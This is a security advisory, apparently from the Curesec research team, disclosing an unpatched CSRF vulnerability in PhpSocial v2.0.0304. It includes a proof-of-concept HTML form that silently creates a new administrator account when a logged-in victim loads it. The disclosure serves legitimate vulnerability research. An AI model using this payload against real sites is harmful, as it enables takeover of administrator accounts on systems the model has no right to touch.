@@ -1,0 +1,74 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:    PhpSocial v2.0.0304_20222226
+Fixed in:            not fixed
+Fixed Version Link:  n/a
+Vendor Webite:       http://phpsocial.net
+Vulnerability Type:  CSRF
+Remote Exploitable:  Yes
+Reported to vendor:  11/21/2015
+Disclosed to public: 12/21/2015
+Release mode:        Full Disclosure
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. Overview
+
+CVSS
+
+Medium 5.1 AV:N/AC:H/Au:N/C:P/I:P/A:P
+
+Description
+
+PhpSocial is a social networking software written in PHP. In version v2.0.0304,
+it does not have CSRF protection, which means that an attacker can perform
+actions for a victim, if the victim visits an attacker controlled site while
+logged in.
+
+3. Proof of Concept
+
+Add a new admin:
+
+
+<html>
+  <body>
+    <form action="http://localhost/PhpSocial_v2.0.0304_20222226/cms_phpsocial/admin/AdminAddViewadmins.php" method="POST">
+      <input type="hidden" name="admin_username" value="admin2" />
+      <input type="hidden" name="admin_password" value="admin" />
+      <input type="hidden" name="admin_password_confirm" value="admin" />
+      <input type="hidden" name="admin_name" value="admin2" />
+      <input type="hidden" name="admin_email" value="admin2@example.com" />
+      <input type="hidden" name="task" value="addadmin" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+4. Solution
+
+This issue was not fixed by the vendor.
+
+5. Report Timeline
+
+11/21/ Contacted Vendor (no reply)
+2015
+12/10/ Tried to remind vendor (no email is given, security@phpsocial.net does
+2015   not exist, and contact form could not be used because the website is
+       down)
+12/21/ Disclosed to public
+2015
+
+
+Blog Reference:
+https://blog.curesec.com/article/blog/PhpSocial-v200304-CSRF-133.html
+ 
+--
+blog:  https://blog.curesec.com
+tweet: https://twitter.com/curesec
+
+Curesec GmbH
+Curesec Research Team
+Romain-Rolland-Str 14-24
+13089 Berlin, Germany
